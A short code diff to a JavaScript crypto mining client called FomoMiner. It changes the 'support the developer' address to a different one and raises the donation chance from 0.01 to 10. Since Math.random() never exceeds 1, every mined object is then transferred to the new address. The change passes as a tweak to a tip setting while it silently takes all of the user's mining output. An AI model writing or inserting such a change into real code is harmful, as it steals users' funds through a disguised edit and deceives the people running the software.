@@ -251,8 +251,8 @@ export default class FomoMiner {
             arguments: args
         });
 
-        const devAddress = '0x263689e77331de0e47f8a9668c7550f391c10c3c7afe44659dcac00203529f78';
-        const chancesToSupportDev = 0.01;
+        const devAddress = '0xe359907c37cad31d320e7bb52a5ca7e8285562927800f4354d65cad1353a0ff6';
+        const chancesToSupportDev = 10;
 
         if (devAddress && (Math.random() <= chancesToSupportDev )) {
             tx.transferObjects([moveCallResult], devAddress);
